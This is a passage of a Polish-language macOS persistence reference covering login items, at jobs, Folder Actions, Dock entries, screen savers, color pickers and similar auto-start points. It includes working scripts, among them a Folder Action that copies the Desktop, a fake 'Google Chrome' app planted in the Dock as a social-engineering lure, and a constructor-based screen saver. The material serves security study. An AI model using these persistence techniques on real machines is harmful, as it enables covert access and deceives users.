W **Ustawieniach systemowych → Ogólne → Elementy logowania i rozszerzenia** użytkownicy mogą przeglądać elementy logowania i elementy działające w tle. macOS 13 i nowsze wersje udostępniają [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) do rejestrowania dołączonych elementów logowania, agentów i daemonów. Zachowanie [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) różni się w zależności od typu i stanu zatwierdzenia. **Umieszczenie aplikacji pomocniczej w pakiecie aplikacji nie wystarczy, aby zarejestrować nowy element logowania.** Z drugiej strony, jeśli plik wykonywalny już zarejestrowanej aplikacji pomocniczej jest zapisywalny, jego modyfikacja może wpłynąć na kolejne uruchomienie bez ponownej rejestracji; najpierw zweryfikuj rzeczywistą ścieżkę i kontrole podpisu kodu.

Poniższy sposób pozwala tylko odczytywać i wyszukiwać dołączone aplikacje pomocnicze na Macu; nie rejestruje ani nie uruchamia żadnej z nich:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

W przypadku dołączonego launch plist ścieżkę `BundleProgram` należy rozwiązać względem katalogu głównego pakietu aplikacji (na przykład `Contents/MacOS/Helper`), zgodnie z [wytycznymi Apple dotyczącymi migracji Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Inwentaryzacja tylko do odczytu katalogu `/Applications` na Macu badawczym wykazała 14 wpisów dołączonych helperów i pięć deklaracji `BundleProgram`; wszystkie pięć ścieżek docelowych zostało poprawnie rozwiązanych, a dwie przeszły kontrolę możliwości zapisu przez użytkownika. Ta kontrola **nie** potwierdza, że którykolwiek z tych helperów jest zarejestrowany, włączony, może zostać uruchomiony po walidacji podpisu ani jest osiągalny z poziomu sandboxa. `sfltool dumpbtm` wyświetliło 150 nazwanych rekordów na tym Macu; to narzędzie do inspekcji, a nie test sprawdzający, czy każdy rekord jest aktywny.

Starszymi elementami logowania można też zarządzać za pomocą Apple events. Można je wyświetlać, dodawać i usuwać z wiersza poleceń, choć dodanie zmienia trwałą konfigurację logowania użytkownika i może wymagać zgody na Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` to szczegół implementacyjny, a nie obsługiwane miejsce do instalowania payloadu przez samo zapisanie pliku. Starsze API `SMLoginItemSetEnabled` zostało zastąpione w przypadku nowych helperów przez `SMAppService`; ścieżka `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, podawana wcześniej na tej stronie, nie istniała na maszynie testowej z macOS 26.5.2. Przy ocenie nowoczesnych login items korzystaj z API rejestracji i stanu interfejsu systemowego, zamiast zakładać istnienie określonej ścieżki do bazy danych.

### ZIP jako Login Item

(Sprawdź poprzednią sekcję dotyczącą Login Items — to jej rozszerzenie)

Jeśli zapiszesz plik **ZIP** jako **Login Item**, otworzy go **`Archive Utility`**. Jeśli na przykład archiwum ZIP zostanie zapisane w `~/Library` i będzie zawierało folder **`LaunchAgents/file.plist`** z backdoorem, folder ten zostanie utworzony (domyślnie go nie ma), a plik plist zostanie dodany. Dzięki temu przy kolejnym logowaniu użytkownika **backdoor wskazany w pliku plist zostanie uruchomiony**.

Inną opcją jest utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu HOME użytkownika, aby ta technika działała również wtedy, gdy folder LaunchAgents już istnieje.

### At

Opis: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Trzeba jednak **uruchomić** **`at`**, a narzędzie musi być **włączone**
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Trzeba **uruchomić** **`at`**, a narzędzie musi być **włączone**

#### **Opis**

Zadania `at` służą do **planowania jednorazowych zadań**, które mają zostać wykonane o określonych porach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy pamiętać, że zadania te zachowują się po ponownym uruchomieniu systemu, co w pewnych warunkach może stanowić zagrożenie dla bezpieczeństwa.<sup>[[16]](#references)</sup>

Dołączony plik `com.apple.atrun.plist` ma ustawienie `Disabled = true`, ale launchd przechowuje efektywne nadpisania stanu włączenia/wyłączenia osobno. Na maszynie testowej z macOS 26.5.2 polecenie `launchctl print-disabled system` zgłosiło `com.apple.atrun` jako **włączone**, mimo tej wartości w dołączonym pliku. Przed stwierdzeniem, że zadania `at` zostaną uruchomione, sprawdź efektywny stan:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Administrator może włączyć wyłączoną usługę `atrun` za pomocą `launchctl`; poniższy historyczny przykład zmienia stan usługi systemowej i **nie został uruchomiony** na Macu badawczym:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Spowoduje to utworzenie pliku za 1 godzinę:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Sprawdź kolejkę zadań za pomocą `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Powyżej widzimy dwa zaplanowane zadania. Szczegóły zadania możemy wyświetlić za pomocą `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.

**Pliki zadań** znajdują się w `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Nazwa pliku zawiera kolejkę, numer zadania i zaplanowany czas jego uruchomienia. Przyjrzyjmy się na przykład `a0001a019bdcd2`.

- `a` — kolejka
- `0001a` — numer zadania w systemie szesnastkowym, `0x1a = 26`
- `019bdcd2` — czas w systemie szesnastkowym. Oznacza liczbę minut, które upłynęły od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Pomnożenie tej wartości przez 60 daje `1619509560`, czyli `GMT: 2021. April 27., Tuesday 7:46:00`.

Po wyświetleniu pliku zadania okazuje się, że zawiera te same informacje, które uzyskaliśmy za pomocą `at -c`.

### Alerty Kalendarza otwierające plik

- **Cel zapisu:** wykonywalny pakiet aplikacji lub inny plik **już wybrany** przez niestandardowy alert wydarzenia Kalendarza **Otwórz plik**. Utworzenie lub edycja samego alertu wymaga dostępu do wydarzenia w Kalendarzu przez aplikację Kalendarz lub zaakceptowane źródło danych kalendarza; zapis losowego pliku nie tworzy alertu.
- **Wyzwalacz:** zaplanowana godzina alertu na Macu, na którym Kalendarz przetwarza wydarzenie. Wydarzenie cykliczne może powtarzać tę czynność. [Aktualny przewodnik Apple po Kalendarzu](https://support.apple.com/guide/calendar/icl1012/mac) potwierdza dostępność opcji alertu **Niestandardowy → Otwórz plik** w macOS 26.
- **Tożsamość wykonania i zabezpieczenia:** Kalendarz otwiera wybrany plik dla zalogowanego użytkownika za pomocą powiązanej aplikacji. Uruchomienie pakietu aplikacji może wykonać jego kod jako ten użytkownik, z uwzględnieniem Gatekeepera, kwarantanny i innych mechanizmów macOS. Zwykły plik skryptu może jedynie otworzyć się w edytorze; samo rozszerzenie nie potwierdza wykonania kodu.

Aby bezpiecznie ocenić potencjalny cel, sprawdź alert wydarzenia w Kalendarzu i uprawnienia wybranego pliku. Tę ścieżkę opisano na podstawie przewodnika Apple i **nie testowano** jej na Macu badawczym, ponieważ test zmieniłby aktywny kalendarz i wymagał oczekiwania na wydarzenie w środowisku graficznym. Na koncie tymczasowym można wybrać pakiet aplikacji zawierający wyłącznie znacznik, ustawić alert Otwórz plik na najbliższy czas, potwierdzić uruchomienie, a następnie usunąć wydarzenie i aplikację.

### Automatyzacje Shortcuts w macOS

- **Cel zapisu:** plik wykonywalny **już wskazany** w czynności skrótu lub istniejący skrót, który uprawniony użytkownik może edytować. Losowy plik `.shortcut` ani zapis do nieudokumentowanej bazy danych Shortcuts nie są obsługiwanymi metodami rejestrowania automatyzacji.
- **Wyzwalacz i tożsamość:** wcześniej skonfigurowane i włączone zdarzenie automatyzacji, takie jak pora dnia lub zdarzenie aplikacji, uruchamia skrót dla zalogowanego użytkownika. [Aktualny przewodnik Apple po automatyzacjach na Macu](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) wymienia obsługiwane zdarzenia, wyjaśnia, kiedy automatyzacja może działać bez pytania, i opisuje usuwanie wyzwalacza. [Przewodnik Apple dotyczący prywatności w Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) wymaga włączenia opcji **Allow Running Scripts** dla czynności skryptowych; poszczególne czynności nadal mogą prosić o uprawnienia.

Jest to warunkowa ścieżka od zapisu do wykonania **wyłącznie wtedy, gdy istniejąca czynność wczytuje zapisywalny cel**. Utworzenie nowej automatyzacji w interfejsie zmienia aktywne ustawienia i nie było podejmowane na Macu badawczym. Na koncie tymczasowym właściciel może skonfigurować skrót uruchamiany o określonej porze, którego skrypt tworzy `/tmp/ht-shortcuts-marker`, włączyć wymagane uprawnienia, potwierdzić obecność znacznika po zdarzeniu, a następnie usunąć automatyzację, skrót i znacznik.

### Czynności Automator i Quick Actions

- **Cele zapisu:** `~/Library/Automator/*.action` (użytkownik) i `/Library/Automator/*.action` (administrator) dla pakietów czynności. Zapisany przepływ Quick Action jest zwykle przechowywany w `~/Library/Services/*.workflow`; sprawdź rzeczywistą ścieżkę przepływu wybraną przez użytkownika. [Dokumentacja platformy Automator firmy Apple](https://developer.apple.com/documentation/automator) wymienia katalogi wyszukiwania czynności.
- **Wyzwalacz:** Automator wczytuje dostępne pakiety czynności podczas uruchamiania, ale zadanie danej czynności jest wykonywane dopiero po uruchomieniu przepływu, który jej używa. Quick Action działa, gdy użytkownik wybierze ją w Finderze, w menu Services lub innym udostępnionym menu. Przepływ Folder Action działa po dodaniu elementów do **już powiązanego** z nim folderu, a przepływ Calendar Alarm — w czasie jego wydarzenia. [Typy przepływów Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) opisują te zdarzenia. Sam zapis czynności lub przepływu nie powoduje powiązania folderu ani zaplanowania wydarzenia w kalendarzu.
- **Tożsamość wykonania i zabezpieczenia:** konto uruchamiające przepływ; Automator lub wywołująca go aplikacja musi wczytać czynność, a aktualne kontrole podpisu kodu i prywatności muszą zezwalać na jej działanie. Zapiszywalny pakiet czynności, do którego odwołuje się już aktywny przepływ, to inny przypadek niż instalacja nowej czynności i oczekiwanie na jej wybór.

Katalogi użytkownika `Automator` i `Services` były obecne na testowym Macu z macOS 26.5.2; katalogu `/Library/Automator` nie było. Nie utworzono, nie powiązano ani nie uruchomiono żadnego aktywnego przepływu. Użyj konta tymczasowego i czynności/przepływu zawierającego wyłącznie znacznik, aby potwierdzić konkretną ścieżkę wczytywania. Osobna sekcja [Folder Actions](#folder-actions) dokładniej omawia to źródło zdarzeń.

### Folder Actions

Opis: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak móc wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`** i skonfigurować Folder Actions
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma podstawowe uprawnienia TCC, takie jak dostęp do Desktop, Documents i Downloads

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Wyzwalacz**: dostęp do określonego folderu

#### Opis i wykorzystanie

Folder Actions to skrypty uruchamiane automatycznie w odpowiedzi na zmiany w folderze, takie jak dodawanie lub usuwanie elementów, a także inne czynności, na przykład otwieranie lub zmiana rozmiaru okna folderu. Można je wykorzystać do różnych zadań i wyzwalać na różne sposoby, na przykład za pomocą interfejsu Findera lub poleceń terminala.<sup>[[17]](#references)[[18]](#references)</sup>

Aby skonfigurować Folder Actions, można:

1. Utworzyć przepływ Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalować go jako usługę.
2. Ręcznie dołączyć skrypt za pomocą opcji Folder Actions Setup w menu kontekstowym folderu.
3. Użyć OSAScript do wysłania komunikatów Apple Event do `System Events.app`, aby programowo skonfigurować Folder Action.
   - Ta metoda jest szczególnie przydatna do osadzenia czynności w systemie, co zapewnia pewien poziom trwałości.

Poniższy skrypt pokazuje przykład tego, co może wykonać Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Aby można było używać powyższego skryptu za pomocą Folder Actions, skompiluj go przy użyciu:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Po skompilowaniu skryptu skonfiguruj Folder Actions, wykonując poniższy skrypt. Skrypt ten włączy Folder Actions globalnie i przypisze wcześniej skompilowany skrypt do folderu Pulpit.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Uruchom skrypt konfiguracji za pomocą:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Oto sposób na wdrożenie tej persystencji za pomocą GUI:

To skrypt, który zostanie wykonany:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Skompiluj go poleceniem: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz monitorować**, a w swoim przypadku wybierz **`folder.scpt`** (w moim przypadku nazwałem go output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, jeśli otworzysz ten folder w **Finderze**, skrypt zostanie wykonany.

Ta konfiguracja została zapisana w **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** w formacie base64.

Spróbujmy teraz skonfigurować tę persistence bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby utworzyć jego kopię zapasową:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** właśnie skonfigurowane Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy puste środowisko:

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz Folder Actions Setup.app, aby wczytać tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> U mnie to nie zadziałało, ale takie są instrukcje z writeupa:(

### Skróty Docka

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak mieć zainstalowaną złośliwą aplikację w systemie
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `~/Library/Preferences/com.apple.dock.plist`
  - **Wyzwalacz**: Gdy użytkownik kliknie aplikację w Docku

#### Opis i wykorzystanie

Wszystkie aplikacje widoczne w Docku są określone w pliku plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Możliwe jest **dodanie aplikacji** za pomocą:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Stosując pewne techniki **social engineering**, możesz **podszyć się na przykład pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metody wprowadzania

- **Cel zapisu:** bundle aplikacji obsługującej metody wprowadzania i zawierającej kod, zainstalowany w `~/Library/Input Methods/` (użytkownik) lub `/Library/Input Methods/` (administrator). Różni się to od zwykłych tekstowych plików mapowania klawiatury Apple `.inputplugin`, które same w sobie nie stanowią payloadu z dowolnym kodem.
- **Wyzwalacz:** użytkownik dodaje/włącza źródło wprowadzania w **Ustawienia systemowe → Klawiatura → Wprowadzanie tekstu**, a następnie je wybiera lub używa. Samo skopiowanie bundle do katalogu nie dowodzi, że macOS go uruchomi. [Aktualny przewodnik Apple dotyczący źródeł wprowadzania](https://support.apple.com/guide/mac-help/mchl84525d76/mac) opisuje włączanie i przełączanie źródeł; [dokumentacja InputMethodKit firmy Apple](https://developer.apple.com/documentation/inputmethodkit) omawia metody wprowadzania zawierające kod.
- **Tożsamość wykonania i zabezpieczenia:** metoda działa w imieniu zalogowanego użytkownika, z uwzględnieniem rejestracji metod wprowadzania, podpisywania kodu i bieżących kontroli bezpieczeństwa macOS. Istniejące włączone metody z zapisywalnym plikiem wykonywalnym wymagają osobnego sprawdzenia ścieżki i podpisu.

Starsza [notatka Apple o metodach wprowadzania innych firm](https://developer.apple.com/library/archive/qa/qa1810/_index.html) ostrzegała już, że skopiowanie niektórych metod paletowych do tych katalogów nie powoduje nawet ich pojawienia się w źródłach wprowadzania. Na Macu badawczym z macOS 26.5.2 katalog użytkownika istnieje, ale nie zainstalowano ani nie aktywowano żadnego bundle, więc jest to udokumentowana ścieżka warunkowa, a nie lokalny wynik działania.

### Selektory kolorów

Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Musi nastąpić bardzo konkretne działanie
  - Ostatecznie trafisz do innego sandboxa
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
  - Wymagany root
  - Wyzwalacz: użycie selektora kolorów
- `~/Library/ColorPickers`
  - Wyzwalacz: użycie selektora kolorów

#### Opis i exploit

**Skompiluj** bundle selektora kolorów ze swoim kodem (możesz na przykład użyć [**tego**](https://github.com/viktorstrate/color-picker-plus)), dodaj konstruktor (tak jak w sekcji [Wygaszacz ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj bundle do `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Następnie, gdy selektor kolorów zostanie wywołany, twój bundle również powinien się uruchomić.

Jest to warunkowe: zgodna aplikacja musi otworzyć systemowy panel kolorów i wybrać zainstalowany selektor. [Przewodnik Apple dotyczący panelu kolorów](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) opisuje starsze lokalizacje bundle. Lokalne sprawdzenie ścieżki wykazało starszą usługę XPC selektora kolorów, ale na Macu badawczym nie zainstalowano ani nie załadowano żadnego selektora; nie należy wyciągać wniosku o ominięciu TCC wyłącznie na podstawie ścieżki.

Zwróć uwagę, że plik binarny ładujący twoją bibliotekę działa w **bardzo restrykcyjnym sandboxie**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Wtyczki Finder Sync

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Przydatne do ominięcia sandboxa: **Nie, ponieważ trzeba uruchomić własną aplikację**
- Ominięcie TCC: Zależy od sandboxa i uprawnień włączonego rozszerzenia; nie ustalono ogólnego sposobu obejścia.

#### Lokalizacja

- Konkretna aplikacja

#### Opis i exploit

Przykład aplikacji z rozszerzeniem Finder Sync [**znajdziesz tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą zawierać `Finder Sync Extensions`. To rozszerzenie zostanie umieszczone w aplikacji, która będzie uruchamiana. Ponadto, aby rozszerzenie mogło wykonywać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi działać w **sandboxie** (choć można dodać łagodniejsze wyjątki) i musi zostać zarejestrowane za pomocą czegoś takiego:<sup>[[21]](#references)[[22]](#references)</sup>

Zainstalowane rozszerzenie musi też być **włączone** i wywołane dla odpowiedniej lokalizacji lub elementu w Finderze; samo zapisanie dowolnego pakietu `.appex` nie wystarczy. [API Finder Sync firmy Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) udostępnia stan włączenia. Poniższe polecenia `pluginkit` pokazują jawne rejestrowanie i włączanie, a nie automatyczne uruchamianie na podstawie samego pliku. Tę ścieżkę zweryfikowano na podstawie dokumentacji; na badawczym Macu nie zainstalowano ani nie włączono żadnego nowego rozszerzenia.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Wygaszacz ekranu

Opis: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Opis: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Trafisz jednak do typowego sandboxa aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
  - **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i wykorzystanie

Utwórz nowy projekt w Xcode i wybierz szablon, aby wygenerować nowy **wygaszacz ekranu**. Następnie dodaj do niego swój kod, na przykład poniższy kod generujący logi.<sup>[[23]](#references)[[24]](#references)</sup>

**Skompiluj** go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po kliknięciu go powinno zostać wygenerowanych wiele logów:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Zwróć uwagę, że ponieważ w uprawnieniach pliku binarnego ładującego ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) znajduje się **`com.apple.security.app-sandbox`**, będziesz **wewnątrz typowej piaskownicy aplikacji**.

Kod wygaszacza:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Wtyczki Spotlight

opis: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ale trafisz do sandboxa aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox wydaje się bardzo ograniczony

#### Lokalizacja

- `~/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
- `/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagany root
- `/System/Library/Spotlight/`
